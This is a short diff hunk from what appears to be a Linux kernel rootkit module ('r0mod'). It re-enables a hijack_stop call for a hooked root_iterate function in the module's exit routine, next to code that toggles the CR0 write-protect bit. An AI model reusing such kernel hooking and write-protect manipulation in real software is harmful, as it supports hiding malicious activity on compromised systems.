@@ -357,7 +357,7 @@ static void __exit r0mod_exit(void)
         write_cr0(read_cr0() | 0x10000);
     }
 
-    //hijack_stop(root_iterate);
+    hijack_stop(root_iterate);
     //hijack_stop(proc_iterate);
 }
 
